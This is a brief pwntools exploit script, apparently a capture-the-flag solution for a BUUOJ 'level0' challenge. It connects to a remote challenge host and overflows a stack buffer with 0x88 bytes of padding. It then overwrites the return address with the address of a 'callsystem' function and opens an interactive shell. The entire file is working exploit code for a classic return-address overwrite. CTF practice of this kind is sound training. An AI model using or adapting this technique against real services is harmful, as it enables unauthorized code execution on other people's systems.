from pwn import *

io = remote('node4.buuoj.cn', 25719)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => {}'.format(hex(address).upper()))
payload = b'a'*(0x80 + 0x8) + p64(address)
# payload = b'a'*(0x80 + 0x8) + p64(0x400596)
io.sendline(payload)
io.interactive()